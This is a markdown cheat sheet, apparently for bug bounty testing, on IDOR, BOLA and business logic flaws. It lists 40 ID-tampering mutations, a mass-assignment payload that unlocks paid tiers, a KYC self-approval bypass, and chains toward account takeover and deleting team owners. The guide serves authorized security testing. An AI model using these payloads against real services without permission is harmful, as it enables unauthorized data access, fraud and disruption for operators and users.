# IDOR, BOLA & Business Logic Flaws

## Mechanism Overview
Insecure Direct Object References (IDOR) and Broken Object-Level Authorization (BOLA) occur when an application provides direct access to objects based on user-supplied input without verifying authorization. Business Logic flaws are failures in the state machine rules and workflows of the application.

---

## 1. The 8-Way Authorization Comparison Matrix
When testing any authenticated endpoint or resource identifier, execute these 8 comparison pivots:

| # | Comparison Pivot | Mechanism Tested | Vulnerability Class |
|---|---|---|---|
| **1** | **Same Object, Different User** | Access User A's resource using User B's token | Horizontal IDOR / BOLA |
| **2** | **Different Tenant, Same Role** | Access Tenant Org A's asset using Tenant Org B's member | Tenant Isolation Bypass |
| **3** | **Low vs High Privilege** | Execute Admin endpoint with regular Member token | Vertical Privilege Escalation |
| **4** | **Read vs Write/Delete** | If `GET` is blocked, test `PUT`, `PATCH`, `DELETE` on object | Partial Authorization Bypass |
| **5** | **Single vs Bulk Endpoint** | Test `/api/v1/users/bulk` or `/export` vs `/api/v1/users/1` | Bulk Operation Authorization Gap |
| **6** | **Current vs Legacy API** | Test `/api/v1/` vs `/api/v2/` or `/internal/` vs `/public/` | API Version Authorization Desync |
| **7** | **UI Disabled vs API Direct** | Submit disabled UI actions directly via raw HTTP | Client-Side Only Enforcement |
| **8** | **Object Mass Assignment** | Inject parameters (`"role":"admin"`, `"is_verified":true`) | Property-Level Authorization Flaw |

---

## 2. High-Signal IDOR Patterns

### Horizontal IDOR (User to User)
*   **Mechanism:** Changing a `user_id`, `account_id`, or `org_id` parameter to access another user's data.
*   **The "Naked IDOR / Raw BOLA" Baseline:** Before applying complex obfuscation or mutation catalogs, always test raw sequential or alternate IDs on **secondary nested sub-resources** (e.g. `/api/v1/users/{id}/shipping_addresses`, `/orders/{id}/invoices`, `/drafts/{id}`). Developers frequently enforce strict tenant middleware on the root `/user/profile` but completely omit authorization checks on secondary CRUD endpoints.
*   **Offensive Pivot:** Look for integers or UUIDs in URLs and JSON bodies. Test against `/api/v1/user/{ID}/profile` or GraphQL query filters.

### The 40 ID-Tamper Mutation Catalog (Bypassing Shallow Authz Checks)
When changing `GET /account/victim_id` directly returns `403 Forbidden`, test these 40 mutations to exploit parser/authz splits:

```
┌── Reference-Shape Mutations ────────────────────────────────────────────────────────┐
│ 1. Predictable ID:       /api/v1/account/2222 -> /api/v1/account/3333               │
│ 2. ID Combo:             /api/v1/UserA/data/2222 -> /api/v1/UserB/data/3333         │
│ 3. Integer Wrap Array:   {"Account":2222} -> {"Account":[3333]}                     │
│ 4. Email as ID:          {"email":"UserA@x.com"} -> {"email":"UserB@x.com"}         │
│ 5. Group/Tenant ID:      /group/CompanyA -> /group/CompanyB                         │
│ 6. Group+User Combo:     {"email":"userA@CompanyA"} -> {"email":"userB@CompanyB"}   │
│ 7. Nested Object Wrap:   {"Account":2222} -> {"Account":{"Account":3333}}           │
│ 8. Multiple Objects:     {"Account":2222, "Account":3333}                           │
│ 9. Predictable Token:    {"token":"...1df7jS1..."} -> {"token":"...1df7jS2..."}     │
├── Delimiter & Injection Wrappers (Own ID + Victim Appended) ────────────────────────┤
│ 10. CRLF Encoded:        {"Account":"2222%0d%0a3333"}                               │
│ 11. LF Encoded:          {"Account":"2222%0a3333"}                                  │
│ 12. CR Encoded:          {"Account":"2222%0d3333"}                                  │
│ 13. Null Byte:           {"Account":"2222%003333"}                                  │
│ 14. Array Pair (HPP):    {"Account":[2222, 3333]} (Validator checks #1, DB uses #2) │
│ 15. Semicolon:           {"Account":"2222;3333"}                                    │
│ 16. Comma Separator:     {"Account":"2222,3333"}                                    │
│ 17. Pipe Separator:      {"Account":"2222|3333"}                                    │
│ 18. CRLF + Header:       {"Account":"2222%0a%0dcc:3333"}                            │
│ 19. Ampersand:           {"Account":"2222&3333"}                                    │
│ 20. Hash:                {"Account":"2222#%3333"}                                   │
├── Modern Parser, Type & Route Mutations (21–40) ────────────────────────────────────┤
│ 21. JSON Type Juggle:    {"id":"3333"} -> {"id":3333} (string vs integer check)     │
│ 22. Leading Zero/Octal:  /account/3333 -> /account/03333 or /account/0o6405        │
│ 23. Hex ID:              {"id":3333} -> {"id":"0xD05"}                             │
│ 24. Scientific/Float:    {"id":3333} -> {"id":3333.0} or {"id":"3.333e3"}          │
│ 25. Unicode Digits:      fullwidth ３３３３ / Arabic-Indic ٣٣٣٣                    │
│ 26. Padded / Whitespace: {"id":"3333 "} / {"id":"\t3333"}                          │
│ 27. Path Traversal in ID:/files/mine/../3333                                        │
│ 28. Matrix Param:        /account/2222;id=3333 (Tomcat / Spring path-param split)    │
│ 29. Trailing Suffix:     /account/3333.json / /3333/ / /3333%2f / /3333%20          │
│ 30. Wildcard / Range:    /account/* / /account/0 / /account/-1 / /account/1..100    │
│ 31. Alias Keywords:      id=me -> id=admin / id=system / id=0                       │
│ 32. Multi-Zone Dupes:    path=/2222 + ?id=3333 + body: {"id":3333}                  │
│ 33. Content-Type to XML: {"id":3333} -> <req><id>3333</id></req>                   │
│ 34. Content-Type to Form:{"id":3333} -> id=2222&id=3333 (HPP)                       │
│ 35. GraphQL Batch/Array: variables:{"id":["3333"]} or Aliased query batching        │
│ 36. Key Shadowing:       {"user":{"id":2222}, "id":3333} (Last-wins deserializer)   │
│ 37. JSON5 / Comments:    {"id":3333/*comment*/} or BOM byte prefix                 │
│ 38. Case of Hex UUID:    a1b2-C3D4 <-> A1B2-c3d4 or {urn:uuid:...}                  │
│ 39. Double URL Encode:   %2533 (Decoded once by WAF, second time by controller)     │
│ 40. Trusted Header ID:   X-User-Id: 3333 / X-Account-Context: orgB                  │
└─────────────────────────────────────────────────────────────────────────────────────┘
```

### Destructive IDOR (High & Critical Impact)
*   **Team / Organization Owner Deletion:**
    *   *Endpoint:* `DELETE /api/v1/teams/{team_id}/members/{member_id}`
    *   *Flaw:* The controller verifies the caller is authenticated, but fails to assert that:
        1. `Caller.TenantId == Target.TenantId`
        2. `Caller.Role > Target.Role` (preventing members from deleting Owners).
    *   *Impact:* An attacker from a free account deletes enterprise team owners, completely decapitating workspace administration.
*   **Support Ticket Interception & Deletion:**
    *   *Endpoint:* `GET/DELETE /api/support/tickets/{ticket_uuid}`
    *   *Flaw:* Support desks often use sequential ticket IDs or fail to map ticket ownership to the logged-in session, leaking internal KYC documents, passwords sent in plain text, and allowing ticket sabotage.

### Feature Toggle Mass Assignment (Free Pro/Enterprise Upgrade)
*   **Mechanism:** API updates trust request payloads without strict parameter DTO allowlisting.
*   **Offensive Payloads in `PUT /api/v1/users/me` or `/api/v1/tenants/current`:**
    ```json
    {
      "name": "Attacker",
      "is_pro": true,
      "is_premium": true,
      "tier": "enterprise",
      "plan_id": 99,
      "subscription_status": "active",
      "credits": 1000000,
      "features": ["unlimited_export", "ai_copilot", "sso_enabled"]
    }
    ```

### Logic State Desync & Permission Inversion (Group/Role Removal)
*   **Mechanism:** When a user is removed or demoted from an organization, background queues or active session caches fail to revoke pending actions or API tokens immediately.
*   **Attack Pattern:** User A (Admin) creates a pending request or invites User C $\rightarrow$ User A is removed from the organization $\rightarrow$ User A's pending invitations or pre-authorized actions can still be approved/executed by User A or processed asynchronously by the server.

---


## 3. Advanced Business Logic Bypasses

### Step-Skipping (State Machine Bypass)
*   **Mechanism:** Forcing the application's state machine to skip a validation step (e.g., Skip Payment $\rightarrow$ Success state).
*   **Audit Goal:** Identify the "Success / Confirm" endpoint and navigate to it directly from the "Initiate" state.

### Self-Approval & Separation of Duties Inversion (KYC & Verification Workflows)
*   **Mechanism:** Workflows that require verification by a secondary actor or administrator (e.g. KYC identity document verification, vendor onboarding, expense approvals, withdrawal reviews).
*   **Failure:** Backend checks if the approval endpoint (`POST /api/v1/kyc/verify` or `POST /api/approvals/{request_id}/approve`) receives an authenticated request, but **fails to enforce that `reviewer_id != applicant_id`** or relies on a client-supplied status payload (`{"status": "approved", "verified": true}`).
*   **Exploitation:**
    1. Regular user uploads fake/empty identity verification documents.
    2. Capture the pending document ID or approval request ID.
    3. Issue `POST /api/v1/kyc/documents/{id}/review` with regular user's token and payload `{"decision": "APPROVED"}`.
    4. The user's account transitions to "Fully Verified / Tier 3" status instantly without administrative oversight!

### Race Condition / Quantity & Array Manipulation
*   **Mechanism:** Modifying the *quantity* or *type* of items during a multi-step transaction.
*   **Offensive Pivot:** Use negative values (`quantity: -1`), extreme decimals (`0.0001`), or JSON arrays (`"items": ["safe", "malicious"]`) to bypass price calculations or validation rules.

---

## 4. Escalation & Chaining Logic
*   **IDOR (Read)** $\rightarrow$ **Sensitive PII / API Token Leak** $\rightarrow$ **Full Account Takeover (ATO)**.
*   **IDOR (Destructive)** $\rightarrow$ **Team Owner Deletion** $\rightarrow$ **Total Business Disruption (Critical Bounty)**.
*   **Mass Assignment** $\rightarrow$ **Enterprise Feature Unlock** $\rightarrow$ **Financial Impact / Unauthorized Access**.
*   **Step-Skip** $\rightarrow$ **Subscription / Quota Bypass** $\rightarrow$ **Service Theft**.

---

## 5. Operational Checklist
*   Are there numeric or UUID identifiers in the URL or JSON?
*   Does `DELETE` on a resource check the caller's role hierarchy?
*   Can you inject `is_pro: true`, `role: "admin"`, or `plan_id` in profile update requests?
*   Does removing a user instantly invalidate their access to pending tickets, files, or invitations?

